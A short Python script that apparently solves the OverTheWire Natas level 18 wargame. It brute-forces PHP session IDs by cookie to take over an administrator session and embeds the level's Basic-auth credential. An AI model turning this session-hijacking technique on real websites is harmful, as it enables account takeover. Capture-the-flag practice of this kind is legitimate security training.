#!/usr/bin/python
import requests

for i in range(640):
	payload = {"username": "natas19", "password": "natas19"}
	headers = {"cookie": "PHPSESSID={}".format(i), "Authorization": "Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA=="}
	r = requests.post("http://natas18.natas.labs.overthewire.org/index.php", data = payload, headers = headers)

	if "regular user" in r.text:
		print("nope")
	else:
		print("{}".format(i)+": "+r.text)
		exit()
